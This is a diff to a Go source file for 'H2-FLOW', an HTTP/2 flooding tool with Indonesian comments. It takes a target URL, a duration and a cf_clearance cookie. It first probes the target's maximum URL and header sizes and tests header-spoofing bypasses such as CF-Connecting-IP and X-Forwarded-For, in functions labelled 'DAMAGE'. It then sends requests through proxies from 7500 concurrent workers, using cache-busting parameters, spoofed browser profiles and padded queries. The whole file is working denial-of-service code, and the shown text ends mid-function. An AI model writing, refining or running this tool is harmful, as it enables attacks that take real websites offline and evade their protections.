@@ -21,6 +21,7 @@ import (
 "time"
 )
 
+
 // ================== WARNA ==================
 const (
 HAPUS = "\033[0m"
@@ -32,9 +33,15 @@ PUCAT = "\033[38;5;203m"
 PUNYAMU = "\033[38;5;204m"
 PUNYA_LU_PUCAT = "\033[38;5;218m"
 MASA_DEPAN_NYA = "\033[97m"
-Speed = 7500
-to = 6 * time.Second
-KEP = 30 * time.Second
+
+
+
+// ================== Tergantung spek ==================
+Speed = 7500 // Kalo vps lu kentang turunin tak
+// ================== Tergantung Proxy ==================
+to = 6 * time.Second // Timeout
+// ================== Tergantung Target ==================
+KEP = 30 * time.Second // Keep-Alive
 )
 
 // ================== PROF ==================
@@ -193,22 +200,30 @@ DNT: "",
 },
 }
 
+// ================== CACHE ==================
 var CBP = []string{"_", "cb", "rnd", "ts", "cache", "v", "ver", "t", "q", "s", "page", "id", "rand", "random"}
+// ================== SESSION ==================
 var COOKIES = []string{"session", "__cfduid", "_ga", "_gid", "visitor", "token", "cf_clearance", "__cf_bm"}
+// ================== REFERER ==================
 var REF = []string{
 "https://www.google.com/search?q=",
 "https://www.bing.com/search?q=",
 "https://www.yahoo.com/search?p=",
 "https://www.duckduckgo.com/?q=",
 }
+
 type CLI struct {
 client *http.Client
 ip string
 }
+
+// ================== PROSESOR ==================
 func init() {
 runtime.GOMAXPROCS(runtime.NumCPU())}
+// ================== FAKE IP ==================
 func RIP(rng *rand.Rand) string {
 return fmt.Sprintf("%d.%d.%d.%d", rng.Intn(256), rng.Intn(256), rng.Intn(256), rng.Intn(256))}
+// ================== DAMAGE ==================
 func RST(rng *rand.Rand, length int) string {
 const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
 b := make([]byte, length)
@@ -218,107 +233,118 @@ return string(b)}
 var CCK string
 var ifModifiedSince = time.Now().AddDate(-1, 0, 0).Format(time.RFC1123)
 
-// ================== PROBE RACE ==================
-type PRBC struct {
-ID int
-Client *http.Client
-Proxy *url.URL
-}
-func PWRC(target string, size int, clients []PRBC, paramName string, headerName string, headerValue string) (bool, error) {
-if len(clients) == 0 {
-return false, fmt.Errorf("None")
-}
-resultChan := make(chan bool, 1)
-ctx, cancel := context.WithCancel(context.Background())
-defer cancel()
-for _, pc := range clients {
-go func(c PRBC) {
-var err error
-var resp *http.Response
-testURL := target
-if paramName != "" {
-if strings.Contains(testURL, "?") {
-testURL += "&" + paramName + "=" + strings.Repeat("x", size)
-} else {
-testURL += "?" + paramName + "=" + strings.Repeat("x", size)
-}
-}
-req, err := http.NewRequestWithContext(ctx, "GET", testURL, nil)
-if err != nil {
-return
-}
-if headerName != "" {
-req.Header.Set(headerName, headerValue)
-}
-resp, err = c.Client.Do(req)
-if err != nil {
-return
-}
-defer resp.Body.Close()
-select {
-case resultChan <- true:
-case <-ctx.Done():
-}
-}(pc)
-}
-select {
-case <-resultChan:
-return true, nil
-case <-time.After(6 * time.Second):
-return false, fmt.Errorf("timeout")
-}
-}
-
-// ================== URL SIZE ==================
-func PMP(target string, clients []PRBC) int {
+// ================== DAMAGE 1 ==================
+func PMP(target string) int {
+client := &http.Client{
+Timeout: 5 * time.Second,
+Transport: &http.Transport{
+TLSClientConfig: &tls.Config{InsecureSkipVerify: true},},}
 sizes := []int{64, 128, 256, 512, 1024, 2048, 4096, 8192}
-berhasil := 0
+Berhasil := 0
 for _, size := range sizes {
-ok, _ := PWRC(target, size, clients, "big", "", "")
-if !ok {
-return berhasil
+testURL := target
+if strings.Contains(testURL, "?") {
+testURL += "&big=" + strings.Repeat("x", size)
+} else {
+testURL += "?big=" + strings.Repeat("x", size)}
+req, _ := http.NewRequest("GET", testURL, nil)
+req.Header.Set("User-Agent", "Mozilla/5.0")
+resp, err := client.Do(req)
+if err != nil {
+break
 }
-berhasil = size
-}
-return berhasil
+resp.Body.Close()
+if resp.StatusCode == http.StatusOK || resp.StatusCode == http.StatusFound || resp.StatusCode == http.StatusMovedPermanently {
+Berhasil = size
+} else if resp.StatusCode == http.StatusBadRequest || resp.StatusCode == http.StatusRequestURITooLong || resp.StatusCode == 413 {
+break
+} else {
+break
+}}
+return Berhasil
 }
 
-// ================== MAX HEAD ==================
-func PMH(target string, clients []PRBC) int {
+// ================== DAMAGE 2 ==================
+func PMH(target string) int {
+client := &http.Client{
+Timeout: 5 * time.Second,
+Transport: &http.Transport{
+TLSClientConfig: &tls.Config{InsecureSkipVerify: true},},}
 sizes := []int{512, 1024, 2048, 4096, 8192, 16384}
-berhasil := 0
+Berhasil := 0
 for _, size := range sizes {
-ok, _ := PWRC(target, size, clients, "", "X-Large-Data", strings.Repeat("x", size))
-if !ok {
-return berhasil
+req, _ := http.NewRequest("GET", target, nil)
+req.Header.Set("User-Agent", "Mozilla/5.0")
+req.Header.Set("X-Large-Data", strings.Repeat("x", size))
+resp, err := client.Do(req)
+if err != nil {
+break
 }
-berhasil = size
-}
-return berhasil
+resp.Body.Close()
+if resp.StatusCode == http.StatusOK || resp.StatusCode == http.StatusFound || resp.StatusCode == http.StatusMovedPermanently {
+Berhasil = size
+} else if resp.StatusCode == http.StatusBadRequest || resp.StatusCode == 413 || resp.StatusCode == 431 {
+break
+} else {
+break
+}}
+return Berhasil
 }
 
-// ================== HEAD BYPASS ==================
-func PHR(target string, proxyIP string, clients []PRBC) map[string]bool {
+// ================== DAMAGE 3 ==================
+func PHR(target string, ProxyX string) map[string]bool {
+client := &http.Client{
+Timeout: 5 * time.Second,
+Transport: &http.Transport{
+TLSClientConfig: &tls.Config{InsecureSkipVerify: true},},}
 parsedTarget, _ := url.Parse(target)
 targetHost := parsedTarget.Hostname()
+if ProxyX == "" {
 rng := rand.New(rand.NewSource(time.Now().UnixNano()))
-headerTests := map[string]string{
-"X-Original-URL": "/" + RST(rng, 8),
-"X-Forwarded-Host": targetHost,
-"X-Request-ID": strconv.FormatInt(rng.Int63(), 16),
-"CDN-Loop": "cloudflare",
-"CF-Connecting-IP": proxyIP,
-"True-Client-IP": proxyIP,
+ProxyX = fmt.Sprintf("%d.%d.%d.%d", rng.Intn(256), rng.Intn(256), rng.Intn(256), rng.Intn(256))}
+
+// ================== HEADERS BYPASS ==================
+HeadersBypas := []string{
+"X-Original-URL",
+"X-Forwarded-Host",
+"X-Request-ID",
+"CDN-Loop",
+"CF-Connecting-IP",
+"True-Client-IP",
 }
+// ================== HEADERS BYPASS ==================
 result := make(map[string]bool)
-for h, val := range headerTests {
-ok, _ := PWRC(target, 1, clients, "", h, val)
-result[h] = ok
+for _, h := range HeadersBypas {
+req, _ := http.NewRequest("GET", target, nil)
+req.Header.Set("User-Agent", "Mozilla/5.0")
+switch h {
+case "X-Original-URL":
+req.Header.Set("X-Original-URL", "/"+RST(rand.New(rand.NewSource(time.Now().UnixNano())), 8))
+case "X-Forwarded-Host":
+req.Header.Set("X-Forwarded-Host", targetHost)
+case "X-Request-ID":
+req.Header.Set("X-Request-ID", strconv.FormatInt(rand.Int63(), 16))
+case "CDN-Loop":
+req.Header.Set("CDN-Loop", "cloudflare")
+case "CF-Connecting-IP":
+req.Header.Set("CF-Connecting-IP", ProxyX)
+case "True-Client-IP":
+req.Header.Set("True-Client-IP", ProxyX)}
+resp, err := client.Do(req)
+if err != nil {
+result[h] = false
+continue
 }
+resp.Body.Close()
+if resp.StatusCode == http.StatusOK || resp.StatusCode == http.StatusFound || resp.StatusCode == http.StatusMovedPermanently {
+result[h] = true
+} else {
+result[h] = false
+}}
 return result
 }
 
-// ================== HSUPPORT ==================
+// ================== HTTP ==================
 func HSUPPORT(target string) string {
 parsed, _ := url.Parse(target)
 host := parsed.Hostname()
@@ -341,7 +367,7 @@ return "H3"
 }
 
 // ================== ORIGIN ==================
-func ORIGIN(target string, clients []PRBC) []string {
+func ORIGIN(target string) []string {
 parsed, _ := url.Parse(target)
 host := parsed.Hostname()
 candidates := []string{
@@ -352,42 +378,57 @@ candidates := []string{
 "",
 }
 var valid []string
+client := &http.Client{
+Timeout: 5 * time.Second,
+Transport: &http.Transport{
+TLSClientConfig: &tls.Config{InsecureSkipVerify: true},},}
 for _, origin := range candidates {
-ok, _ := PWRC(target, 1, clients, "", "Origin", origin)
-if ok {
-valid = append(valid, origin)
+req, _ := http.NewRequest("GET", target, nil)
+req.Header.Set("User-Agent", "Mozilla/5.0")
+if origin != "" {
+req.Header.Set("Origin", origin)}
+resp, err := client.Do(req)
+if err != nil {
+continue
 }
-}
+resp.Body.Close()
+if resp.StatusCode >= 200 && resp.StatusCode < 400 {
+valid = append(valid, origin)}}
 if len(valid) == 0 {
-valid = append(valid, "https://"+host)
-}
+valid = append(valid, "https://"+host)}
 return valid
 }
 
-// ================== UA TEST ==================
-func UA_TEST(target string, clients []PRBC) []string {
+// ================== USER AGENT ==================
+func UA_TEST(target string) []string {
 testUAs := []string{
 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36",
 "Mozilla/5.0 (Linux; Android 15; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36",
 "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
-"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
-}
+"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",}
 var valid []string
+client := &http.Client{
+Timeout: 5 * time.Second,
+Transport: &http.Transport{
+TLSClientConfig: &tls.Config{InsecureSkipVerify: true},},}
 for _, ua := range testUAs {
-ok, _ := PWRC(target, 1, clients, "", "User-Agent", ua)
-if ok {
-valid = append(valid, ua)
+req, _ := http.NewRequest("GET", target, nil)
+req.Header.Set("User-Agent", ua)
+resp, err := client.Do(req)
+if err != nil {
+continue
 }
-}
+resp.Body.Close()
+if resp.StatusCode >= 200 && resp.StatusCode < 400 {
+valid = append(valid, ua)}}
 if len(valid) == 0 {
-valid = append(valid, testUAs[0])
-}
+valid = append(valid, testUAs[0])}
 return valid
 }
 
-// ================== REFFERER ==================
-func REFFERER(target string, clients []PRBC) []string {
+// ================== REFERER ==================
+func REFFERER(target string) []string {
 parsed, _ := url.Parse(target)
 host := parsed.Hostname()
 testReferers := []string{
@@ -398,56 +439,67 @@ testReferers := []string{
 "",
 }
 var valid []string
+client := &http.Client{
+Timeout: 5 * time.Second,
+Transport: &http.Transport{
+TLSClientConfig: &tls.Config{InsecureSkipVerify: true},},}
 for _, ref := range testReferers {
-ok, _ := PWRC(target, 1, clients, "", "Referer", ref)
-if ok {
-valid = append(valid, ref)
-}
-}
-if len(valid) == 0 {
-valid = append(valid, "https://"+host+"/")
-}
-return valid
-}
-
-// ================== PPHEAD ==================
-func PPHEAD(target string, proxyIPs []string, clients []PRBC) []string {
-testIPs := []string{"127.0.0.1", "192.168.1.1", "10.0.0.1", "8.8.8.8"}
-for _, p := range proxyIPs {
-if p != "" {
-testIPs = append(testIPs, p)
-}
-}
-var valid []string
-for _, ip := range testIPs {
-ok, _ := PWRC(target, 1, clients, "", "X-Forwarded-For", ip)
-if ok {
-valid = append(valid, ip)
-}
-}
-if len(valid) == 0 {
-valid = append(valid, "127.0.0.1")
-}
-return valid
-}
-
-// ================== HMETHOD ==================
-func HMETHOD(target string, clients []PRBC) []string {
-methods := []string{"GET", "POST", "OPTIONS"}
-var valid []string
-for _, method := range methods {
-client := clients[0].Client
-var req *http.Request
-var err error
-if method == "POST" {
-req, err = http.NewRequest("POST", target, strings.NewReader(""))
-req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
-} else {
-req, err = http.NewRequest(method, target, nil)
-}
+req, _ := http.NewRequest("GET", target, nil)
+req.Header.Set("User-Agent", "Mozilla/5.0")
+if ref != "" {
+req.Header.Set("Referer", ref)}
+resp, err := client.Do(req)
 if err != nil {
 continue
 }
+resp.Body.Close()
+if resp.StatusCode >= 200 && resp.StatusCode < 400 {
+valid = append(valid, ref)}}
+if len(valid) == 0 {
+valid = append(valid, "https://"+host+"/")}
+return valid
+}
+
+// ================== IP HEADERS ==================
+func PPHEAD(target string, proxyIPs []string) []string {
+testIPs := []string{"127.0.0.1", "192.168.1.1", "10.0.0.1", "8.8.8.8"}
+for _, p := range proxyIPs {
+if p != "" {
+testIPs = append(testIPs, p)}}
+var valid []string
+client := &http.Client{
+Timeout: 5 * time.Second,
+Transport: &http.Transport{
+TLSClientConfig: &tls.Config{InsecureSkipVerify: true},},}
+for _, ip := range testIPs {
+req, _ := http.NewRequest("GET", target, nil)
+req.Header.Set("User-Agent", "Mozilla/5.0")
+req.Header.Set("X-Forwarded-For", ip)
+resp, err := client.Do(req)
+if err != nil {
+continue
+}
+resp.Body.Close()
+if resp.StatusCode >= 200 && resp.StatusCode < 400 {
+valid = append(valid, ip)}}
+if len(valid) == 0 {
+valid = append(valid, "127.0.0.1")}
+return valid
+}
+
+// ================== METHOD HTTP ==================
+func HMETHOD(target string) []string {
+methods := []string{"GET", "POST", "OPTIONS"}
+var valid []string
+client := &http.Client{
+Timeout: 5 * time.Second,
+Transport: &http.Transport{
+TLSClientConfig: &tls.Config{InsecureSkipVerify: true},},}
+for _, method := range methods {
+req, _ := http.NewRequest(method, target, nil)
+if method == "POST" {
+req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+req.Body = io.NopCloser(strings.NewReader(""))}
 req.Header.Set("User-Agent", "Mozilla/5.0")
 resp, err := client.Do(req)
 if err != nil {
@@ -455,48 +507,61 @@ continue
 }
 resp.Body.Close()
 if resp.StatusCode >= 200 && resp.StatusCode < 400 {
-valid = append(valid, method)
-}
-}
+valid = append(valid, method)}}
 if len(valid) == 0 {
-valid = append(valid, "GET")
-}
+valid = append(valid, "GET")}
 return valid
 }
 
-// ================== ENCOD ==================
-func ENCOD(target string, clients []PRBC) []string {
+// ================== ENCODING ==================
+func ENCOD(target string) []string {
 encodings := []string{"gzip, deflate, br", "gzip, deflate", "gzip", "br", "identity"}
 var valid []string
+client := &http.Client{
+Timeout: 5 * time.Second,
+Transport: &http.Transport{
+TLSClientConfig: &tls.Config{InsecureSkipVerify: true},},}
 for _, enc := range encodings {
-ok, _ := PWRC(target, 1, clients, "", "Accept-Encoding", enc)
-if ok {
-valid = append(valid, enc)
+req, _ := http.NewRequest("GET", target, nil)
+req.Header.Set("User-Agent", "Mozilla/5.0")
+req.Header.Set("Accept-Encoding", enc)
+resp, err := client.Do(req)
+if err != nil {
+continue
 }
-}
+resp.Body.Close()
+if resp.StatusCode >= 200 && resp.StatusCode < 400 {
+valid = append(valid, enc)}}
 if len(valid) == 0 {
-valid = append(valid, "gzip, deflate, br")
-}
+valid = append(valid, "gzip, deflate, br")}
 return valid
 }
 
-// ================== CACH ==================
-func CACH(target string, clients []PRBC) []string {
+// ================== CACHE-CONTROL ==================
+func CACH(target string) []string {
 controls := []string{"no-cache", "no-store", "max-age=0", "must-revalidate"}
 var valid []string
+client := &http.Client{
+Timeout: 5 * time.Second,
+Transport: &http.Transport{
+TLSClientConfig: &tls.Config{InsecureSkipVerify: true},},}
 for _, cc := range controls {
-ok, _ := PWRC(target, 1, clients, "", "Cache-Control", cc)
-if ok {
-valid = append(valid, cc)
+req, _ := http.NewRequest("GET", target, nil)
+req.Header.Set("User-Agent", "Mozilla/5.0")
+req.Header.Set("Cache-Control", cc)
+resp, err := client.Do(req)
+if err != nil {
+continue
 }
-}
+resp.Body.Close()
+if resp.StatusCode >= 200 && resp.StatusCode < 400 {
+valid = append(valid, cc)}}
 if len(valid) == 0 {
-valid = append(valid, "no-cache")
-}
+valid = append(valid, "no-cache")}
 return valid
 }
 
-// ================== GABUNGKAN HASIL ==================
+// ================== GABUNGKAN ==================
 type PREST struct {
 VOR []string
 VUA []string
@@ -513,6 +578,8 @@ Origin string
 Referer string
 SecFetchSite string
 }
+
+// ================== ORIGIN PROF ==================
 func GPFO(origin string, host string) ORPL {
 switch origin {
 case "https://" + host:
@@ -543,36 +610,30 @@ default:
 return ORPL{
 Origin: "",
 Referer: "",
-SecFetchSite: "cross-site",
-}
-}
-}
+SecFetchSite: "cross-site",}}}
 
 // ================== MAIN ==================
 func main() {
 if len(os.Args) < 2 {
 fmt.Println("Cara pakai: H2-FLOW.go <target> <duration> <cookie>")
 fmt.Println("Contoh: H2-FLOW.go https://target.com 60 \"cf_clearance=xxx\"")
-os.Exit(1)
-}
+os.Exit(1)}
 tgt := os.Args[1]
 dur := 0
 if len(os.Args) >= 3 {
 if d, err := strconv.Atoi(os.Args[2]); err == nil && d > 0 {
 dur = d
-}
-}
+}}
 if len(os.Args) >= 4 {
-CCK = os.Args[3]
-}
+CCK = os.Args[3]}
 parsed, _ := url.Parse(tgt)
 host := parsed.Hostname()
 if strings.HasPrefix(host, "www.") {
-host = host[4:]
-}
+host = host[4:]}
 
-// ================== BACA PROXY ==================
 var PRX []*url.URL
+
+// ================== Nama Proxy ==================
 file, err := os.Open("proxy.txt")
 if err == nil {
 defer file.Close()
@@ -586,67 +647,19 @@ if !strings.HasPrefix(line, "http://") && !strings.HasPrefix(line, "https://") {
 line = "http://" + line
 }
 if p, err := url.Parse(line); err == nil {
-PRX = append(PRX, p)
-}
-}
-}
+PRX = append(PRX, p)}}}
 if len(PRX) == 0 {
-PRX = append(PRX, nil)
-}
+PRX = append(PRX, nil)}
 var ProxyX string
 var proxyIPs []string
 for _, p := range PRX {
 if p != nil {
-proxyIPs = append(proxyIPs, p.Hostname())
-}
-}
+proxyIPs = append(proxyIPs, p.Hostname())}}
 if len(proxyIPs) > 0 {
-ProxyX = proxyIPs[0]
-}
-
-// ================== BUAT 3 PROBE CLIENT ==================
-var PRBCS []PRBC
-limit := 3
-if len(PRX) < 3 {
-limit = len(PRX)
-}
-for i := 0; i < limit && i < len(PRX); i++ {
-p := PRX[i]
-tr := &http.Transport{
-Proxy: http.ProxyURL(p),
-TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
-MaxIdleConns: 10,
-IdleConnTimeout: 30 * time.Second,
-}
-client := &http.Client{
-Timeout: 5 * time.Second,
-Transport: tr,
-}
-PRBCS = append(PRBCS, PRBC{
-ID: i + 1,
-Client: client,
-Proxy: p,
-})
-}
-if len(PRBCS) == 0 {
-tr := &http.Transport{
-TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
-MaxIdleConns: 10,
-IdleConnTimeout: 30 * time.Second,
-}
-client := &http.Client{
-Timeout: 5 * time.Second,
-Transport: tr,
-}
-PRBCS = append(PRBCS, PRBC{
-ID: 1,
-Client: client,
-Proxy: nil,
-})
-}
+ProxyX = proxyIPs[0]}
 
 // ================== BYPASS PARALEL ==================
-fmt.Printf("%s\n▶ Proses Bypass!%s\n", IJO, HAPUS)
+fmt.Printf("%s▶ Proses Bypass (Paralel)!%s\n", IJO, HAPUS)
 
 var wg sync.WaitGroup
 wg.Add(10)
@@ -657,52 +670,28 @@ var HVERSI string
 var VORI, VUAS, VREF, VIPS []string
 var VMET, VENC, VCAC []string
 
-go func() {
-defer wg.Done()
-MaxP = PMP(tgt, PRBCS)
-}()
-go func() {
-defer wg.Done()
-MaxHead = PMH(tgt, PRBCS)
-}()
-go func() {
-defer wg.Done()
-Supported = PHR(tgt, ProxyX, PRBCS)
-}()
-go func() {
-defer wg.Done()
-HVERSI = HSUPPORT(tgt)
-}()
-go func() {
-defer wg.Done()
-VORI = ORIGIN(tgt, PRBCS)
-}()
-go func() {
-defer wg.Done()
-VUAS = UA_TEST(tgt, PRBCS)
-}()
-go func() {
-defer wg.Done()
-VREF = REFFERER(tgt, PRBCS)
-}()
-go func() {
-defer wg.Done()
-VIPS = PPHEAD(tgt, proxyIPs, PRBCS)
-}()
-go func() {
-defer wg.Done()
-VMET = HMETHOD(tgt, PRBCS)
-}()
-go func() {
-defer wg.Done()
-VENC = ENCOD(tgt, PRBCS)
-}()
-go func() {
-defer wg.Done()
-VCAC = CACH(tgt, PRBCS)
-}()
+go func() { defer wg.Done(); MaxP = PMP(tgt) }()
+go func() { defer wg.Done(); MaxHead = PMH(tgt) }()
+go func() { defer wg.Done(); Supported = PHR(tgt, ProxyX) }()
+go func() { defer wg.Done(); HVERSI = HSUPPORT(tgt) }()
+go func() { defer wg.Done(); VORI = ORIGIN(tgt) }()
+go func() { defer wg.Done(); VUAS = UA_TEST(tgt) }()
+go func() { defer wg.Done(); VREF = REFFERER(tgt) }()
+go func() { defer wg.Done(); VIPS = PPHEAD(tgt, proxyIPs) }()
+go func() { defer wg.Done(); VMET = HMETHOD(tgt) }()
+go func() { defer wg.Done(); VENC = ENCOD(tgt) }()
+go func() { defer wg.Done(); VCAC = CACH(tgt) }()
 
 wg.Wait()
+
+// ================== FALLBACK (biar gak panic) ==================
+if len(VMET) == 0 { VMET = []string{"GET"} }
+if len(VUAS) == 0 { VUAS = []string{"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36"} }
+if len(VREF) == 0 { VREF = []string{"https://www.google.com/"} }
+if len(VENC) == 0 { VENC = []string{"gzip, deflate, br"} }
+if len(VCAC) == 0 { VCAC = []string{"no-cache"} }
+if len(VIPS) == 0 { VIPS = []string{"127.0.0.1"} }
+if len(VORI) == 0 { VORI = []string{"https://" + host} }
 
 PRLT := PREST{
 VOR: VORI,
@@ -711,9 +700,50 @@ VRE: VREF,
 VPH: VIPS,
 VME: VMET,
 VEN: VENC,
-VCC: VCAC,
-}
+VCC: VCAC,}
 _ = PRLT
+
+wcs := make([]CLI, len(PRX))
+
+// ================== H2-FLOW ==================
+for i, ProxyY := range PRX {
+tr := &http.Transport{
+DialContext: (&net.Dialer{
+Timeout: 4 * time.Second,
+KeepAlive: KEP,
+}).DialContext,
+DisableKeepAlives: false,
+DisableCompression: false,
+MaxIdleConns: 10000,
+MaxIdleConnsPerHost: 5000,
+MaxConnsPerHost: 0,
+IdleConnTimeout: KEP,
+TLSClientConfig: &tls.Config{
+InsecureSkipVerify: true,
+MinVersion: tls.VersionTLS12,
+MaxVersion: tls.VersionTLS13,
+NextProtos: []string{"h2", "http/1.1"},
+CipherSuites: []uint16{
+tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
+tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
+tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
+tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
+tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256,
+tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,},},
+ForceAttemptHTTP2: true,
+TLSHandshakeTimeout: 4 * time.Second,
+ResponseHeaderTimeout: 4 * time.Second,
+ExpectContinueTimeout: 0 * time.Second,}
+ip := ""
+if ProxyY != nil {
+tr.Proxy = http.ProxyURL(ProxyY)
+ip = ProxyY.Hostname()}
+jar, _ := cookiejar.New(nil)
+client := &http.Client{
+Transport: tr,
+Timeout: to,
+Jar: jar,}
+wcs[i] = CLI{client: client, ip: ip}}
 
 // ================== LOGO ==================
 fmt.Printf("%s", MASA_DEPAN_NYA)
@@ -738,16 +768,15 @@ IJO, HAPUS,
 PUTIH, label, HAPUS,
 MERAH, HAPUS,
 PUTIH, value, HAPUS,
-MERAH, IJO, status, MERAH)
+MERAH, IJO, status, MERAH,)
 } else {
 fmt.Printf("%s〇%s %s%s%s %s:%s %s%s%s\n",
 IJO, HAPUS,
 PUTIH, label, HAPUS,
 MERAH, HAPUS,
-PUTIH, value, HAPUS)
-}
-}
+PUTIH, value, HAPUS)}}
 
+// ================== INFO ==================
 printInfo("Author", "Diz Flyze Ofc              ", "True")
 printInfo("Target", host, "")
 printInfo("Port  ", "443                        ", "True")
@@ -766,8 +795,7 @@ fmt.Printf("%s〇%s %sCookie%s %s:%s %s                            [%s%s%s]\n",
 IJO, HAPUS,
 PUTIH, HAPUS,
 MERAH, HAPUS,
-PUTIH, IJO, "None", PUTIH)
-}
+PUTIH, IJO, "None", PUTIH,)}
 fmt.Printf("%s━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━%s\n", MERAH, HAPUS)
 
 // ================== TIMER ==================
@@ -791,63 +819,11 @@ IJO, HAPUS,
 PUTIH, HAPUS,
 MERAH, HAPUS,
 PUTIH, elapsed, dur, HAPUS,
-MERAH, IJO, "True", MERAH)
-}
-}
-}()
+MERAH, IJO, "True", MERAH)}}}()
 var wg2 sync.WaitGroup
 if dur > 0 {
 time.AfterFunc(time.Duration(dur)*time.Second, func() {
-cancel()
-})
-}
-
-// ================== H2-FLOW ==================
-wcs := make([]CLI, len(PRX))
-for i, ProxyY := range PRX {
-tr := &http.Transport{
-DialContext: (&net.Dialer{
-Timeout: 4 * time.Second,
-KeepAlive: KEP,
-}).DialContext,
-DisableKeepAlives: false,
-DisableCompression: false,
-MaxIdleConns: 10000,
-MaxIdleConnsPerHost: 5000,
-MaxConnsPerHost: 0,
-IdleConnTimeout: KEP,
-TLSClientConfig: &tls.Config{
-InsecureSkipVerify: true,
-MinVersion: tls.VersionTLS12,
-MaxVersion: tls.VersionTLS13,
-NextProtos: []string{"h2", "http/1.1"},
-CipherSuites: []uint16{
-tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
-tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
-tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
-tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
-tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256,
-tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,
-},
-},
-ForceAttemptHTTP2: true,
-TLSHandshakeTimeout: 4 * time.Second,
-ResponseHeaderTimeout: 4 * time.Second,
-ExpectContinueTimeout: 0 * time.Second,
-}
-ip := ""
-if ProxyY != nil {
-tr.Proxy = http.ProxyURL(ProxyY)
-ip = ProxyY.Hostname()
-}
-jar, _ := cookiejar.New(nil)
-client := &http.Client{
-Transport: tr,
-Timeout: to,
-Jar: jar,
-}
-wcs[i] = CLI{client: client, ip: ip}
-}
+cancel()})}
 
 // ================== WORKER ==================
 for i := 0; i < Speed; i++ {
@@ -863,26 +839,31 @@ ref := VREF[rng.Intn(len(VREF))]
 enc := VENC[rng.Intn(len(VENC))]
 cacheCtrl := VCAC[rng.Intn(len(VCAC))]
 FORIP := VIPS[rng.Intn(len(VIPS))]
+
+// ================== ORIGIN ==================
 SLOR := VORI[rng.Intn(len(VORI))]
 OPRF := GPFO(SLOR, host)
+
+// ================== BROWSER ==================
 prof := PFS[rng.Intn(len(PFS))]
+
+// ================== DAMAGE ==================
 Target := tgt
 param := CBP[rng.Intn(len(CBP))]
 if strings.Contains(Target, "?") {
 Target += "&" + param + "=" + strconv.FormatInt(rng.Int63(), 10)
 } else {
-Target += "?" + param + "=" + strconv.FormatInt(rng.Int63(), 10)
-}
+Target += "?" + param + "=" + strconv.FormatInt(rng.Int63(), 10)}
 if MaxP > 0 && rng.Intn(3) == 0 {
 size := MaxP/2 + rng.Intn(MaxP/2)
 if size < 1 {
 size = 64
 }
-Target += "&big=" + strings.Repeat("x", size)
-}
+Target += "&big=" + strings.Repeat("x", size)}
 if rng.Intn(10) == 0 {
-Target += "&" + RST(rng, 8) + "=" + RST(rng, 12)
-}
+Target += "&" + RST(rng, 8) + "=" + RST(rng, 12)}
+
+// ================== REQUEST ==================
 var req *http.Request
 var body io.Reader
 if method == "POST" {
@@ -892,20 +873,23 @@ body = nil
 }
 req, _ = http.NewRequest(method, Target, body)
 if method == "POST" {
-req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
-}
+req.Header.Set("Content-Type", "application/x-www-form-urlencoded")}
+
+// ================== HEADERS ==================
 req.Header.Set("User-Agent", ua)
 req.Header.Set("Accept-Encoding", enc)
 req.Header.Set("Cache-Control", cacheCtrl)
+
+// ================== ORIGIN ==================
 if OPRF.Origin != "" && OPRF.Referer != "" {
 req.Header.Set("Referer", OPRF.Referer)
 } else if ref != "" {
-req.Header.Set("Referer", ref)
-}
+req.Header.Set("Referer", ref)}
 if OPRF.Origin != "" {
-req.Header.Set("Origin", OPRF.Origin)
-}
+req.Header.Set("Origin", OPRF.Origin)}
 req.Header.Set("Sec-Fetch-Site", OPRF.SecFetchSite)
+
+// ================== HEADERS ==================
 req.Header.Set("Accept", prof.Accept)
 req.Header.Set("Accept-Language", prof.Lang)
 req.Header.Set("Connection", "keep-alive")
@@ -916,88 +900,71 @@ req.Header.Set("X-Cache-Buster", strconv.FormatInt(rng.Int63(), 16))
 if prof.SecChUa != "" {
 req.Header.Set("Sec-Ch-Ua", prof.SecChUa)
 req.Header.Set("Sec-Ch-Ua-Mobile", prof.SecChUaMov)
-req.Header.Set("Sec-Ch-Ua-Platform", prof.SecChUaPlat)
-}
+req.Header.Set("Sec-Ch-Ua-Platform", prof.SecChUaPlat)}
 req.Header.Set("Sec-Fetch-Mode", prof.SecFetchMode)
 req.Header.Set("Sec-Fetch-Dest", prof.SecFetchDest)
 if prof.DNT != "" {
-req.Header.Set("DNT", prof.DNT)
-}
+req.Header.Set("DNT", prof.DNT)}
+
+// ================== DAMAGE ==================
 if rng.Intn(3) == 0 {
